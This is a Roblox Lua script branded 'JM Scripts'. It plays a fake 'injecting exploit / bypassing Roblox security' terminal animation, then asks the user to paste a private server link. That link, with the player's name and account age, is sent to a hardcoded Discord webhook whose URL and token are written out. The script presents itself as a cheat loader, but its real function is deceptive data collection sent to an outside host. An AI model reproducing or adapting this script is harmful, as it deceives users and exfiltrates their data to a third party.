-- CONFIG
local WEBHOOK = "https://discordapp.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
local DISCORD = "https://discord.gg/ZPz8Renfz"

-- SERVICES
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- REQUEST
local request =
syn and syn.request or
http_request or
request or
fluxus and fluxus.request

-- WEBHOOK
local function sendWebhook(msg)

if not request then return end

request({
Url = WEBHOOK,
Method = "POST",
Headers = {["Content-Type"] = "application/json"},
Body = HttpService:JSONEncode({
content = msg
})
})

end

-- GUI
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.Parent = game.CoreGui

-- TERMINAL FAKE
local terminal = Instance.new("Frame",gui)
terminal.Size = UDim2.fromScale(1,1)
terminal.BackgroundColor3 = Color3.new(0,0,0)

local text = Instance.new("TextLabel",terminal)
text.Size = UDim2.fromScale(1,1)
text.BackgroundTransparency = 1
text.TextColor3 = Color3.fromRGB(0,255,0)
text.Font = Enum.Font.Code
text.TextSize = 18
text.TextXAlignment = Enum.TextXAlignment.Left
text.TextYAlignment = Enum.TextYAlignment.Top
text.Text = ""

local fakeLines = {

"Injecting JM Scripts...",
"Bypassing Roblox security...",
"Loading assets...",
"Decrypting modules...",
"Connecting to server...",
"Downloading exploit core...",
"Verifying environment...",
"Loading UI framework...",
"Finalizing execution..."

}

for i,v in pairs(fakeLines) do

text.Text = text.Text .. "\n> " .. v
task.wait(0.6)

end

task.wait(1)

terminal:Destroy()

-- MAIN PANEL
local main = Instance.new("Frame",gui)
main.Size = UDim2.fromOffset(500,300)
main.Position = UDim2.fromScale(0.5,0.5)
main.AnchorPoint = Vector2.new(0.5,0.5)
main.BackgroundColor3 = Color3.fromRGB(15,15,25)

local stroke = Instance.new("UIStroke",main)
stroke.Color = Color3.fromRGB(200,120,255)
stroke.Thickness = 2

local corner = Instance.new("UICorner",main)

-- TITLE
local title = Instance.new("TextLabel",main)
title.Size = UDim2.new(1,0,0,40)
title.BackgroundTransparency = 1
title.Text = "JM SCRIPTS"
title.Font = Enum.Font.GothamBold
title.TextSize = 28
title.TextColor3 = Color3.fromRGB(220,170,255)

-- PLAYER INFO
local info = Instance.new("TextLabel",main)
info.Position = UDim2.new(0,0,0,50)
info.Size = UDim2.new(1,0,0,60)
info.BackgroundTransparency = 1
info.Font = Enum.Font.Gotham
info.TextSize = 18
info.TextColor3 = Color3.fromRGB(200,200,200)

info.Text =
"Player: "..player.Name..
"\nAccount Age: "..player.AccountAge.." days"

-- INPUT
local box = Instance.new("TextBox",main)
box.Position = UDim2.new(0.1,0,0.45,0)
box.Size = UDim2.new(0.8,0,0.12,0)
box.PlaceholderText = "Paste private server link..."
box.Font = Enum.Font.Gotham
box.TextSize = 18
box.BackgroundColor3 = Color3.fromRGB(25,25,40)
box.TextColor3 = Color3.new(1,1,1)

local c2 = Instance.new("UICorner",box)

-- BUTTON
local send = Instance.new("TextButton",main)
send.Position = UDim2.new(0.35,0,0.65,0)
send.Size = UDim2.new(0.3,0,0.12,0)
send.Text = "SEND"
send.Font = Enum.Font.GothamBold
send.TextSize = 20
send.BackgroundColor3 = Color3.fromRGB(160,90,255)

local c3 = Instance.new("UICorner",send)

-- CLICK
send.MouseButton1Click:Connect(function()

if box.Text == "" then return end

sendWebhook(
"📩 SERVER RECEIVED\n\n"..
"Player: `" .. player.Name .. "`\n"..
"Account Age: `" .. player.AccountAge .. " days`\n\n"..
box.Text
)

main:Destroy()

-- THANK YOU SCREEN
local thanks = Instance.new("Frame",gui)
thanks.Size = UDim2.fromScale(1,1)
thanks.BackgroundColor3 = Color3.new(0,0,0)

local t = Instance.new("TextLabel",thanks)
t.Size = UDim2.fromScale(1,1)
t.BackgroundTransparency = 1
t.Font = Enum.Font.GothamBold
t.TextScaled = true
t.TextColor3 = Color3.fromRGB(200,160,255)
t.Text = "Obrigado por usar\nJM Scripts 💜"

end)
